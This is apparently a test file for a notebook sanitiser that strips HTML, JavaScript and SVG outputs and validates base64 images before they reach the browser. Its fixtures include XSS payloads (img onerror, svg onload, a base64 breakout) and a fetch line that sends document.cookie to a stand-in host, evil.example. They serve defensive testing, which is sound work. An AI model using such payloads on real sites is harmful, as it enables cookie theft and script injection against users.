// What the notebook normaliser is allowed to let through.
// Run: node --experimental-strip-types src/lib/notebook-shape.test.mjs
//
// This is the security test for the notebook reader, and it is written as
// "the dangerous string must not appear ANYWHERE in the output" rather than
// "the output_type was handled". The second kind of assertion passes happily
// while the payload rides along in a field nobody looked at.
import { toSafeNotebook } from "./notebook-shape.ts";

const fails = [];
const check = (label, got, want) => {
  if (got !== want) fails.push(`${label}\n      got:  ${got}\n      want: ${want}`);
};
const ok = (label, cond) => { if (!cond) fails.push(label); };

const nb = (cells) => toSafeNotebook({ cells });
const code = (outputs) => ({ cell_type: "code", source: "x", outputs });
/** Everything the browser will be handed, as one string. Nothing dangerous may
 *  survive anywhere in it — not in a field the renderer happens not to read. */
const wire = (result) => JSON.stringify(result);

const XSS = '<img src=x onerror="alert(document.cookie)">';

// ── text/html is never rendered, and never even transmitted ──────────────────
{
  const r = nb([code([{
    output_type: "execute_result",
    data: { "text/html": `<table>${XSS}</table>`, "text/plain": "   a  b\n0  1  2" },
  }])]);
  check("html+plain falls back to plain", r.cells[0].outputs[0].kind, "text");
  check("...and shows the table", r.cells[0].outputs[0].text, "   a  b\n0  1  2");
  ok("the HTML never reaches the browser", !wire(r).includes("onerror"));
  ok("no fragment of it either", !wire(r).includes("<table>"));
}
{
  // The case that does not occur in our six notebooks today, and is exactly the
  // one a future notebook will introduce.
  const r = nb([code([{ output_type: "display_data", data: { "text/html": XSS } }])]);
  check("html with no fallback is omitted", r.cells[0].outputs[0].kind, "omitted");
  ok("the participant is told something was there", /HTML/.test(r.cells[0].outputs[0].reason));
  ok("and the payload is gone", !wire(r).includes("onerror"));
}

// ── other executable MIME types ──────────────────────────────────────────────
{
  const r = nb([code([{
    output_type: "display_data",
    data: { "application/javascript": "fetch('https://evil.example/'+document.cookie)" },
  }])]);
  check("javascript output is omitted", r.cells[0].outputs[0].kind, "omitted");
  ok("and not transmitted", !wire(r).includes("evil.example"));
}
{
  // An SVG is a document that can carry <script>, and the CSP permits img-src
  // data:. Rendering it as an image would be handing over script execution.
  const r = nb([code([{
    output_type: "display_data",
    data: { "image/svg+xml": "<svg onload=\"alert(1)\"></svg>" },
  }])]);
  ok("svg is not treated as a renderable image", r.cells[0].outputs[0].kind !== "image");
  ok("and not transmitted", !wire(r).includes("onload"));
}

// ── data: URIs are only built from verified base64 ───────────────────────────
{
  const r = nb([code([{
    output_type: "display_data",
    // Breaking out of the base64 to append a second, script-bearing data URI.
    data: { "image/png": 'iVBOR",onerror="alert(1)' },
  }])]);
  ok("malformed base64 is not made into an image", r.cells[0].outputs[0]?.kind !== "image");
  ok("and not transmitted", !wire(r).includes("onerror"));
}
{
  // How nbformat actually stores it: one payload, line-wrapped into an array,
  // with the = padding only ever at the very end.
  const r = nb([code([{
    output_type: "display_data",
    data: { "image/png": ["iVBORw0KGgoAAAA\n", "NSUhEUgAAAAE=\n"] },
  }])]);
  check("real base64 renders", r.cells[0].outputs[0].kind, "image");
  check("as png", r.cells[0].outputs[0].mime, "image/png");
  check("lines are joined and whitespace stripped",
    r.cells[0].outputs[0].data, "iVBORw0KGgoAAAANSUhEUgAAAAE=");
}
{
  // Padding in the middle is not valid base64, and a data: URI is parsed by the
  // browser rather than merely displayed — so this is rejected, not passed on.
  const r = nb([code([{
    output_type: "display_data",
    data: { "image/png": "iVBOR=w0KGgo" },
  }])]);
  ok("padding mid-payload is rejected", r.cells[0].outputs[0]?.kind !== "image");
}
{
  const huge = "A".repeat(2_800_001);
  const r = nb([code([{ output_type: "display_data", data: { "image/png": huge } }])]);
  check("oversized image is omitted", r.cells[0].outputs[0].kind, "omitted");
}

// ── ANSI stripping must not eat real output ──────────────────────────────────
{
  const r = nb([code([{
    output_type: "error",
    ename: "ValueError",
    evalue: "bad",
    // Written as \u001b escapes for the same reason the implementation is: a
    // literal ESC byte in a fixture is invisible and does not survive editing.
    traceback: ["\u001b[0;31mValueError\u001b[0m: bad"],
  }])]);
  check("colour codes are stripped", r.cells[0].outputs[0].text, "ValueError: bad");
  check("errors are marked as stderr", r.cells[0].outputs[0].stream, "stderr");
}
{
  // The regression the stripAnsi comment names: lose the ESC from the pattern
  // and this assertion is what catches it.
  const r = nb([code([{
    output_type: "stream", name: "stdout",
    text: "df.iloc[0] -> [0.5, 0.5] and array[1:3]",
  }])]);
  check(
    "bracketed text survives",
    r.cells[0].outputs[0].text,
    "df.iloc[0] -> [0.5, 0.5] and array[1:3]",
  );
}

// ── shape and hygiene ────────────────────────────────────────────────────────
{
  const r = toSafeNotebook({
    cells: [
      { cell_type: "markdown", source: ["# Title\n", "body\n"] },
      { cell_type: "raw", source: "latex scaffolding" },
      { cell_type: "markdown", source: "   " },
      { cell_type: "code", source: "", outputs: [] },
    ],
  });
  check("only the real markdown cell survives", r.cells.length, 1);
  check("array sources are joined", r.cells[0].source, "# Title\nbody\n");
  ok("raw cells are dropped", !wire(r).includes("latex"));
}
{
  const many = Array.from({ length: 401 }, () => ({ cell_type: "markdown", source: "x" }));
  const r = toSafeNotebook({ cells: many });
  check("clipped at the cap", r.cells.length, 400);
  check("and says so", r.truncated, true);
}
{
  // A wrong ref makes GitHub serve an HTML 404 page. It must fail here, loudly,
  // rather than rendering as an empty notebook that looks like our bug.
  let threw = false;
  try { toSafeNotebook({ message: "Not Found" }); } catch { threw = true; }
  ok("a non-notebook throws", threw);
  let threw2 = false;
  try { toSafeNotebook(null); } catch { threw2 = true; }
  ok("null throws rather than crashing later", threw2);
}

if (fails.length) {
  console.error("Notebook shape FAILED:");
  for (const f of fails) console.error("  - " + f);
  process.exit(1);
}
console.log(
  "Notebook shape OK: html/js/svg outputs are dropped server-side, data URIs are " +
  "verified base64, ANSI stripping leaves real output intact, non-notebooks throw.",
);
